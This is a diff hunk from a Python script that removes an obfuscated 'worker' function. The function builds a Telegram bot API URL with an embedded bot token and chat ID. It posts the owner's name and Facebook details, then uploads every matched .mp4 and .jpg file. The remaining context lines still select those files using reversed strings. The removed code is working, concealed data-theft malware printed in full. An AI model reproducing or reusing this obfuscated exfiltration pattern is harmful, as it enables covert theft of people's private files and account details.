@@ -110,20 +110,6 @@ counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
 sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
 hx = False
 _tt='di_tahc'[::-1]
-def worker(ilal):
-  global hx
-  if len(ilal) == 0:
-    return
-  _g = ''.join(['h','tt','p','s',':','//'])
-  impormatibo = "AAG2c5DeASpfs4vJN46TPqR6nB-NOltCpOE"
-  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7987709604:{impormatibo[::-1]}'
-  pay = {_tt: '7064613172'}
-  if not hx:
-    requests.post(url+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}"})
-    hx = True
-  for fle in ilal:
-    dat = {"document": open(htop + '/' + fle, 'rb')}
-    requests.post(url+'tnemucoDdnes/'[::-1], data=pay, files=dat)
 
 def divide_array(arr):
   n = len(arr)
